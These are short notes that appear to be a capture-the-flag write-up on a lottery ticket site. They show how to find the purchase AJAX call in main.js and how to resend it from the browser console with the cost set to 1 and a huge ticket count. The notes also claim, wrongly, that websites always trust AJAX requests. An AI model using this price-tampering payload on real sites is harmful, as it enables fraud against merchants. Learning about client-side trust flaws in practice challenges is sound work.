# Notes
- We are looking for any vulnerabilities in the web development of the site. So use f12 or right click inspect to enter it.
- We can now look for the script that is running the program for buying ticets. This is normally under Sources and is named main.js
    - For this file the path is `Top: 0c3a083e...: static: js: main.js`
- Another way to find this is to send a request to the website by buying tickets. You can then find this request under Network
    - The request sent it called Purchase and under initiator shows that main.js is the file where the script is.
- In main.js there is a code block for ajax. Websites will always blindly trust ajax commands sent to them so that is what we need to do.
- By changing the ajax command tickets to 1000000 we can buy a lot of tickets and win the lottery
```
$.ajax({
method : 'POST',
url : '/purchase', 
data : JSON.stringify({
cost : session.cost * tickets,
tickets : tickets
}),
dataType : 'json',
contentType : 'application/json', })
```
- We do not include complete: getUpdate because getUpdate isn't defined inside the code block we are going to send.
- We change tickets to 10000 adn session.cost * tickets to 1. That way we got a lot of tickets for 1 dollar. The updated code block is:
```
$.ajax({
method : 'POST',
url : '/purchase', 
data : JSON.stringify({
cost : 1,
tickets : 100000000,
}),
dataType : 'json',
contentType : 'application/json',
});
```
- Send this into the console and then buy your tickets and win yayyy
